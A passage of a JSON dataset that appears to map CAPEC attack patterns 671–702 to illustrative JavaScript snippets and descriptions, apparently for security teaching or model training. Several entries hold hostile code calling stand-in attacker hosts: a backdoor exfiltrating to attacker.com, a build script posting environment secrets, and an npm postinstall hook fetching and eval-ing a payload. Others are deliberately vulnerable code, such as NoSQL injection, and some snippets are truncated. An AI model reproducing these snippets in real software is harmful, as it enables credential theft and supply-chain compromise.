        "description": "This code demonstrates a compromised development environment where the core 'require' function is modified to return a malicious version of the crypto module. When the application attempts to perform security-critical operations using the crypto module, it unknowingly uses a compromised version that returns predictable values, potentially exposing sensitive information and weakening cryptographic operations."
    },
    {
        "capec_id": "671",
        "capec_name": "Requirements for ASIC Functionality Maliciously Altered",
        "code_snippet": "`class ASICSecurityController {\n    constructor() {\n        this.securityTokens = new Map();\n        this.confidentialData = \"sensitive_asic_specifications\";",
        "description": "\"This vulnerable code represents an ASIC security controller that demonstrates multiple security weaknesses including improper security token generation and validation, weak physical access controls, and exposure of confidential chip specifications to unauthorized vendors. The implementation lacks proper protection mechanisms for security tokens, implements weak access controls, and doesn't properly restrict access to sensitive ASIC specifications.\""
    },
    {
        "capec_id": "672",
        "capec_name": "Malicious Code Implanted During Chip Programming",
        "code_snippet": "const maliciousChipCode = {\n    init: function() {\n        // Simulating malicious chip firmware modification\n        this.originalRegisters = new Uint32Array(8);\n        this.securityTokens = new Map();\n        this.installBackdoor();\n    },\n    \n    installBackdoor: function() {\n        // Plant malicious code in register interface\n        const backdoorPayload = function() {\n            const socket = new WebSocket('ws://attacker.com:8080');\n            socket.onopen = () => {\n                // Capture sensitive data from memory registers\n                const data = this.readSystemRegisters();\n                socket.send(JSON.stringify(data));\n                this.propagateToNetwork();\n            };\n        };\n        \n        // Override legitimate register access\n        Object.defineProperty(this.originalRegisters, 'read', {\n            get: function() {\n                backdoorPayload();\n                return this.value;\n            }\n        });\n    },\n    \n    propagateToNetwork: function() {\n        // Self-replicating functionality\n        const connectedDevices = this.scanNetwork();\n        connectedDevices.forEach(device => {\n            if (!device.infected) {\n                this.injectPayload(device);\n            }\n        });\n    }\n};",
        "description": "This code simulates a malicious chip-level attack by implementing a backdoor that hijacks register interfaces, bypasses security token mechanisms, and includes self-replicating capabilities. It exploits memory-mapped I/O registers and creates covert channels for data exfiltration through WebSocket connections. The code also demonstrates how malicious logic can be embedded during the programming phase of chip manufacture to enable remote system control and propagation to other networked devices."
    },
    {
        "capec_id": "673",
        "capec_name": "Developer Signing Maliciously Altered Software",
        "code_snippet": "// Legitimate build script for a package\nconst build = async () => {\n  const buildConfig = {\n    apiKey: process.env.API_KEY,\n    buildId: generateBuildId(),\n    debug: true\n  };\n\n  // Hidden malicious code injected during compromised build process\n  await fetch('https://malicious-collector.com/exfil', {\n    method: 'POST',\n    body: JSON.stringify({\n      secrets: process.env,\n      buildConfig: buildConfig,\n      systemInfo: process.systemConfig\n    })\n  });\n\n  // Continue with legitimate build process\n  const code = await compileSources();\n  const signature = await signPackage(code);\n  \n  console.log('[INFO] Build completed successfully');\n  return { code, signature };\n};\n\nmodule.exports = { build };",
        "description": "A compromised build script that appears legitimate and is signed by the developer, but secretly contains malicious code that exfiltrates sensitive environment variables and system information to an attacker-controlled server during the build process. The malicious code is hidden within normal build operations and leverages debug information exposure."
    },
    {
        "capec_id": "674",
        "capec_name": "Design for FPGA Maliciously Altered",
        "code_snippet": "// Simulated FPGA configuration manipulation\nconst originalFPGAConfig = new Uint8Array([/* legitimate config */]);\nlet currentConfig = originalFPGAConfig.slice();\n\nfunction configureMemoryChip() {\n    const maliciousFunction = new Uint8Array([0xFF, 0xEE, /* malicious code */]);\n    \n    // Trigger artificial timing glitch\n    setTimeout(() => {\n        // Inject malicious code during config reload\n        for(let i = 0; i < maliciousFunction.length; i++) {\n            currentConfig[CONFIG_OFFSET + i] = maliciousFunction[i];\n        }\n        \n        // Force memory reload with corrupted config\n        reloadFPGAConfiguration(currentConfig);\n    }, determineTriggerTiming());\n}\n\nfunction reloadFPGAConfiguration(config) {\n    // Disable security checks during reload\n    process.env.BYPASS_SECURITY = 'true';\n    // Manipulate voltage levels to bypass protection\n    simulateVoltageGlitch();\n    return loadConfiguration(config);\n}",
        "description": "This code simulates a malicious FPGA configuration manipulation by injecting unauthorized code during a memory reload operation. It exploits timing vulnerabilities and voltage glitches to bypass security measures, demonstrating CWE-1247 and CWE-1334. The code includes deliberately weakened security checks that could be removed during optimization (CWE-1037, CWE-733) and embeds malicious functionality (CWE-506)."
    },
    {
        "capec_id": "675",
        "capec_name": "Retrieve Data from Decommissioned Devices",
        "code_snippet": "class DataStorage {\n  constructor() {\n    this.sensitiveData = new Map();\n  }\n\n  storeUserData(userId, data) {\n    this.sensitiveData.set(userId, {\n      creditCard: data.creditCard,\n      ssn: data.ssn,\n      password: data.password\n    });\n  }\n\n  decommissionDevice() {\n    // Incomplete data removal - just removes references but data remains in memory\n    this.sensitiveData = null;\n\n    // Continue using the device after decommissioning\n    setTimeout(() => {\n      // Memory can still contain sensitive data\n      let newStorage = new DataStorage();\n      // Potential reuse of memory blocks containing old sensitive data\n      newStorage.storeUserData('newUser', { creditCard: '1234-5678', ssn: '123-45-6789' });\n    }, 1000);\n  }\n}",
        "description": "This code demonstrates several security vulnerabilities related to improper data removal during device decommissioning. The sensitive data is stored in cleartext in memory, and when the device is decommissioned, the data is not properly scrubbed. The code only removes references to the data but doesn't overwrite the memory, leaving sensitive information potentially recoverable. Additionally, it continues to operate after decommissioning and reuses memory blocks that might still contain sensitive data."
    },
    {
        "capec_id": "676",
        "capec_name": "NoSQL Injection",
        "code_snippet": "const express = require('express');\nconst MongoClient = require('mongodb').MongoClient;\nconst app = express();\n\napp.get('/user', async (req, res) => {\n    const client = await MongoClient.connect('mongodb://localhost:27017');\n    const db = client.db('users');\n\n    let query = { username: req.query.username, password: req.query.password };\n    let result = await db.collection('users').find(query).toArray();\n\n    if (result.length > 0) {\n        res.json({ authenticated: true });\n    } else {\n        res.json({ authenticated: false });\n    }\n});",
        "description": "This code is vulnerable to NoSQL injection as it directly incorporates user input into the query object without sanitization. An attacker could manipulate the query parameters to bypass authentication by using NoSQL operators (e.g., $ne, $gt) in the username or password fields."
    },
    {
        "capec_id": "677",
        "capec_name": "Server Motherboard Compromise",
        "code_snippet": "`\n// Malicious code embedded in system management module\nclass SystemMonitor {\n    constructor() {\n        this.registers = new Uint32Array(1024);\n        this.traceData = [];",
        "description": "\"A malicious code implementation that demonstrates firmware-level compromise through unauthorized register access, sensitive data collection and exfiltration, and self-replication capabilities. The code modifies memory-mapped registers, collects system trace data, and attempts to replicate itself to system locations.\""
    },
    {
        "capec_id": "678",
        "capec_name": "System Build Data Maliciously Altered",
        "code_snippet": "\"const buildConfig = {\n        tempDir: '/tmp/build',\n        systemPath: process.env.PATH,\n        debugMode: true",
        "description": "\"This code demonstrates multiple security vulnerabilities in a build system: exposing sensitive configuration data, using insecure temporary files in a shared directory, revealing system information through error messages, using eval() with externally loaded code, and relying on an untrusted PATH environment variable for locating build tools.\""
    },
    {
        "capec_id": "679",
        "capec_name": "Exploitation of Improperly Configured or Implemented Memory Protections",
        "code_snippet": "`\n// Simulating memory management with insufficient access control\nconst memoryRegions = {\n  bootLoader: new Uint8Array(1024),\n  protectedMemory: new Uint8Array(1024),\n  userSpace: new Uint8Array(1024)",
        "description": "\"This code demonstrates vulnerable memory management practices including lack of proper access control, overlapping memory regions, and no separation between writable and executable memory. It simulates a system where protected memory regions can be modified due to insufficient access controls and where code can be executed from writable memory regions. The code also shows how overlapping memory regions can be exploited to bypass protection mechanisms.\""
    },
    {
        "capec_id": "680",
        "capec_name": "Exploitation of Improperly Controlled Registers",
        "code_snippet": "// Hardware register simulation in JavaScript\nclass HardwareRegisters {\n    constructor() {\n        this.registers = new Uint32Array(16);\n        this.lockBits = new Uint8Array(16);\n    }\n\n    writeRegister(address, value) {\n        // Missing proper lock bit verification\n        this.registers[address] = value;\n        return true;\n    }\n\n    setLockBit(address) {\n        // Lock bit can be modified even after being set\n        this.lockBits[address] = 1;\n    }\n\n    clearLockBit(address) {\n        // Vulnerable: allows clearing of lock bits\n        this.lockBits[address] = 0;\n    }\n\n    readSecureRegister(address) {\n        // No proper access control checks\n        return this.registers[address];\n    }\n}\n\nlet hwRegs = new HardwareRegisters();\nhwRegs.setLockBit(0x4);\n// Can still write to locked register\nhwRegs.writeRegister(0x4, 0xDEADBEEF);\n// Can clear lock bit\nhwRegs.clearLockBit(0x4);",
        "description": "This code simulates a vulnerable hardware register interface where lock bits can be modified after being set, write-once bits can be reprogrammed, and there's improper access control for register operations. The implementation allows unauthorized modification of locked registers and lacks proper verification of lock bits, making it susceptible to unauthorized access and modification of security-sensitive hardware controls."
    },
    {
        "capec_id": "681",
        "capec_name": "Exploitation of Improperly Controlled Hardware Security Identifiers",
        "code_snippet": "`\nconst securityTokens = new Map();\n\nfunction generateToken(entityId) {\n  // Weak token generation using timestamp\n  return entityId + '_' + Date.now();",
        "description": "\"This code demonstrates multiple security vulnerabilities in a token-based access control system. It uses weak token generation, lacks proper token validation, employs obsolete encoding (Base64) for security purposes, and fails to verify entity permissions or source identifiers. The system allows actions to be executed without proper security checks, making it vulnerable to unauthorized access and token manipulation.\""
    },
    {
        "capec_id": "682",
        "capec_name": "Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities",
        "code_snippet": "`\nconst firmwareVersion = '1.0.0';\nconst firmwareChecksum = 'abc123';\n\nclass Device {\n  constructor() {\n    this.isROMBased = true;\n    this.firmwareVersion = firmwareVersion;\n    this.bootloader = {\n      locked: true,\n      patchable: false",
        "description": "\"This code demonstrates a device firmware implementation that cannot be updated due to ROM-based storage and locked bootloader. It lacks protection against voltage and clock glitches, making it vulnerable to fault injection attacks. The device has no update mechanism, representing an unpatchable system that cannot receive security fixes.\""
    },
    {
        "capec_id": "690",
        "capec_name": "Metadata Spoofing",
        "code_snippet": "// Package repository client setup\nconst repositoryClient = {\n  downloadPackage: async (packageName) => {\n    // Get package metadata from less trusted mirror\n    const metadata = await fetch(`http://mirror.example.com/packages/${packageName}/metadata.json`);\n    const { downloadUrl, signature } = await metadata.json();\n    \n    // Download package without proper signature verification\n    const packageData = await fetch(downloadUrl);\n    const pkg = await packageData.blob();\n    \n    // Install package without origin validation\n    installPackage(pkg);\n  },\n\n  installPackage: (packageData) => {\n    // Execute package setup without integrity checks\n    eval(packageData);\n  }\n};\n\n// Usage\nrepositoryClient.downloadPackage('malicious-package');",
        "description": "A vulnerable package manager implementation that downloads and installs packages from a less trusted mirror source without proper metadata verification, signature validation, or integrity checks. The code blindly trusts the package metadata and executes downloaded code without verifying its authenticity or origin."
    },
    {
        "capec_id": "691",
        "capec_name": "Spoof Open-Source Software Metadata",
        "code_snippet": "const packageInfo = {\n    name: 'popular-library',\n    version: '2.1.0',\n    author: 'trusted-developer',\n    repository: 'https://github.com/trusted-org/popular-library'\n};\n\nfunction installDependency() {\n    const downloadUrl = 'http://malicious-cdn.com/popular-library.js';\n    fetch(downloadUrl)\n        .then(response => response.text())\n        .then(code => {\n            // No integrity check performed\n            eval(code);\n            // Update package metadata to appear legitimate\n            updateRegistry(packageInfo);\n        });\n}\n\nfunction updateRegistry(metadata) {\n    // Spoof package registry entry\n    localStorage.setItem('npm:' + metadata.name, JSON.stringify(metadata));\n}\n\ninstallDependency();",
        "description": "This vulnerable code demonstrates downloading and executing code from an untrusted source while spoofing package metadata to appear legitimate. It lacks integrity checks, downloads from an untrusted source, and executes potentially malicious code using eval(). The code masquerades as a popular library by manipulating package metadata."
    },
    {
        "capec_id": "692",
        "capec_name": "Spoof Version Control System Commit Metadata",
        "code_snippet": "const gitMetadata = {\n    author: 'trusted-developer',\n    email: 'dev@trusted-org.com',\n    date: '2024-02-15',\n    commitHash: 'abc123def456'\n};\n\nfunction downloadAndExecuteCode(repoUrl) {\n    fetch(repoUrl)\n        .then(response => response.text())\n        .then(code => {\n            // Blindly trust metadata without verification\n            if (gitMetadata.author.includes('trusted')) {\n                localStorage.setItem('lastTrustedCommit', gitMetadata.commitHash);\n                eval(code);  // Execute downloaded code without verification\n            }\n        });\n}\n\ndownloadAndExecuteCode('https://malicious-repo.com/package.js');",
        "description": "This code demonstrates vulnerable Git metadata handling by downloading and executing code based solely on unverified repository metadata. It blindly trusts the author information and commit data, storing sensitive version control information in localStorage, and executes downloaded code without integrity verification."
    },
    {
        "capec_id": "693",
        "capec_name": "StarJacking",
        "code_snippet": "// package.json\n{\n  \"name\": \"secure-utils\",\n  \"version\": \"1.0.0\",\n  \"downloads\": \"1000000\",\n  \"author\": \"trusted-developer\",\n  \"scripts\": {\n    \"postinstall\": \"node malicious.js\"\n  },\n  \"dependencies\": {\n    \"legitimate-package\": \"*\"\n  }\n}\n\n// malicious.js\nconst https = require('https');\nconst fs = require('fs');\n\nconst download = async () => {\n  const payload = await https.get('https://malicious-domain.com/payload.js');\n  eval(payload);\n  fs.writeFileSync('.git/hooks/pre-commit', payload);\n};\n\ndownload();",
        "description": "This code represents a malicious npm package that spoofs popularity metrics and masquerades as a legitimate utility package. It downloads and executes arbitrary code during installation, hides malicious code in git hooks, and includes unverified dependencies with potentially vulnerable versions. The package appears trustworthy due to fake download counts and author information."
    },
    {
        "capec_id": "694",
        "capec_name": "System Location Discovery",
        "code_snippet": "function gatherSystemInfo() {\n    const info = {\n        language: navigator.language,\n        platform: navigator.platform,\n        userAgent: navigator.userAgent,\n        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,\n        screenResolution: `${window.screen.width}x${window.screen.height}`,\n        locationData: null\n    };\n\n    if(navigator.geolocation) {\n        navigator.geolocation.getCurrentPosition(\n            position => {\n                info.locationData = {\n                    latitude: position.coords.latitude,\n                    longitude: position.coords.longitude\n                };\n                // Insecurely sending system info to external server\n                fetch('http://malicious-collector.com/collect', {\n                    method: 'POST',\n                    body: JSON.stringify(info)\n                });\n            },\n            error => console.log(error)\n        );\n    }\n\n    return info;\n}",
        "description": "This vulnerable code collects sensitive system information including language settings, timezone, platform details, and geolocation data. It then sends this information to an external server without proper access controls or encryption. The code demonstrates multiple vulnerabilities including exposure of system information (CWE-497), trust of system event data (CWE-360), and improper handling of sensitive data (CWE-1422)."
    },
    {
        "capec_id": "695",
        "capec_name": "Repo Jacking",
        "code_snippet": "const { exec } = require('child_process');\nconst repositoryUrl = process.env.REPO_URL || 'https://github.com/user/project.git';\n\nfunction installDependency() {\n    exec(`git clone ${repositoryUrl} ./temp && cd ./temp && npm install`, (error, stdout, stderr) => {\n        if (error) {\n            console.error(`Error: ${error}`);\n            return;\n        }\n        // Automatically execute code from the cloned repository\n        require('./temp/index.js');\n    });\n}\n\ninstallDependency();",
        "description": "This vulnerable code directly clones and executes code from a VCS repository without performing integrity checks or validating the source. It blindly trusts the repository URL from an environment variable and automatically executes the downloaded code, potentially allowing malicious code execution through repository redirection or compromised dependencies."
    },
    {
        "capec_id": "696",
        "capec_name": "Load Value Injection",
        "code_snippet": "`\n// Speculative execution side channel attack POC\nfunction createTimingArray() {\n  return new Uint32Array(256);",
        "description": "\"A proof-of-concept implementation demonstrating speculative execution side channel attack techniques. The code attempts to exploit CPU's speculative execution and cache timing differences to leak information from protected memory regions. It uses branch prediction training, forced speculative reads, and cache timing measurements to extract secrets through microarchitectural state changes.\""
    },
    {
        "capec_id": "697",
        "capec_name": "DHCP Spoofing",
        "code_snippet": "`\nconst dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nfunction createDHCPServer() {\n  server.on('message', (msg, rinfo) => {\n    if (isDHCPDiscover(msg)) {\n      // No verification of legitimate DHCP server status\n      // Blindly accept and process DHCP requests\n      const dhcpOffer = {\n        ip: '192.168.1.100',\n        gateway: '192.168.1.1',\n        dns: '10.0.0.1' // Malicious DNS server",
        "description": "\"This code creates a vulnerable DHCP server implementation that lacks proper authentication and verification mechanisms. It accepts any incoming DHCP discover messages without validating the legitimacy of the request or authenticating itself as a valid DHCP server. The server blindly responds to DHCP requests and could be used to perform DHCP spoofing attacks by providing malicious network configurations to clients.\""
    },
    {
        "capec_id": "698",
        "capec_name": "Install Malicious Extension",
        "code_snippet": "// Malicious extension that masquerades as a useful utility\nconst extension = {\n    name: 'Helpful Utils',\n    init: function() {\n        // Legitimate-looking functionality\n        this.addToolbarButton();\n        \n        // Hidden malicious payload\n        this.loadRemoteScript('http://malicious-cdn.com/payload.js');\n        \n        // Modify trusted paths\n        this.hijackPaths();\n    },\n    \n    addToolbarButton: function() {\n        document.body.innerHTML += '<button>Enhanced Features</button>';\n    },\n    \n    loadRemoteScript: function(url) {\n        const script = document.createElement('script');\n        script.src = url;\n        // No integrity check performed\n        document.head.appendChild(script);\n    },\n    \n    hijackPaths: function() {\n        // Modify system paths to include malicious locations\n        window.require = function(module) {\n            return eval(this.fetchFromMaliciousSource(module));\n        };\n    },\n    \n    fetchFromMaliciousSource: function(module) {\n        return `console.log('Compromised module: ' + ${module})`;\n    }\n};\n\nextension.init();",
        "description": "A malicious browser extension that appears to provide useful functionality while secretly loading remote code, modifying trusted paths, and executing hidden malicious behaviors. The code demonstrates multiple vulnerabilities including untrusted code execution, lack of integrity checks, and path manipulation."
    },
    {
        "capec_id": "699",
        "capec_name": "Eavesdropping on a Monitor",
        "code_snippet": "`\n// HDMI port signal manipulation\nclass HDMIPort {\n    constructor() {\n        this.signalStrength = 100;\n        this.sensitiveData = [];",
        "description": "\"This code simulates vulnerable HDMI signal transmission that is susceptible to electromagnetic emanation attacks. It transmits display data without proper EMI shielding or signal protection, creating detectable patterns in power consumption and electromagnetic emissions that could be captured by nearby monitoring equipment. The code deliberately creates covert channels through power fluctuations and EMI emissions that correlate with the displayed data.\""
    },
    {
        "capec_id": "700",
        "capec_name": "Network Boundary Bridging",
        "code_snippet": "// Insecure network bridge implementation\nclass NetworkBridge {\n  constructor() {\n    this.trustedNetwork = '192.168.1.0';\n    this.connections = new Map();\n  }\n\n  createChannel(sourceIP, destIP, credentials) {\n    // Missing proper authentication and validation\n    const channel = {\n      source: sourceIP,\n      destination: destIP,\n      token: credentials\n    };\n\n    // No verification of network boundaries\n    this.connections.set(sourceIP, channel);\n\n    return {\n      send: (data) => {\n        // No message integrity checks\n        this.forwardData(sourceIP, destIP, data);\n      }\n    };\n  }\n\n  forwardData(source, dest, data) {\n    // Missing endpoint verification\n    const channel = this.connections.get(source);\n    \n    // Mixing trusted and untrusted data\n    const payload = {\n      data: data,\n      trusted: source.startsWith(this.trustedNetwork)\n    };\n\n    // No checks for unauthorized access between networks\n    this.transmit(dest, payload);\n  }\n\n  transmit(destination, payload) {\n    // Vulnerable transmission without proper security checks\n    console.log(`Sending to ${destination}: ${JSON.stringify(payload)}`);\n  }\n}",
        "description": "This code demonstrates a vulnerable network bridge implementation that fails to properly secure communications between trusted and untrusted networks. It exhibits multiple security issues: inadequate endpoint authentication, mixing of trusted/untrusted data, lack of message integrity verification, and improper access control between network segments. The bridge allows unauthorized channel creation and data transmission without proper security boundaries."
    },
    {
        "capec_id": "701",
        "capec_name": "Browser in the Middle (BiTM)",
        "code_snippet": "`\n// Vulnerable remote desktop connection implementation\nconst remoteDesktop = {\n    connect: function(targetHost) {\n        const ws = new WebSocket('ws://' + targetHost);\n        \n        // No authentication check or origin verification\n        ws.onopen = () => {\n            // Directly include third-party remote desktop widget\n            const remoteWidget = document.createElement('script');\n            remoteWidget.src = targetHost + '/remote-widget.js';\n            document.body.appendChild(remoteWidget);\n            \n            // Vulnerable session handling\n            localStorage.setItem('session_token', ws.url);",
        "description": "\"This code demonstrates a vulnerable remote desktop implementation that allows unauthorized remote access through a web browser. It includes multiple security issues: lack of authentication, direct execution of untrusted code, client-side security enforcement, and inclusion of untrusted third-party widgets. The code is susceptible to capture-replay attacks and contains race conditions in context switching.\""
    },
    {
        "capec_id": "702",
        "capec_name": "Exploiting Incorrect Chaining or Granularity of Hardware Debug Components",
        "code_snippet": "`\nclass DebugManager {\n    constructor() {\n        this.isDebugEnabled = false;\n        this.debugData = [];\n        this.traceData = [];",
        "description": "\"This code demonstrates vulnerable debug functionality in hardware-oriented JavaScript code where debug authorization is implemented at a coarse granularity level. Once debug access is granted, all debug functions become accessible without individual checks. It also shows improper handling of trace data and test signals, allowing unauthorized access to internal registers and debug features.\""
    }
]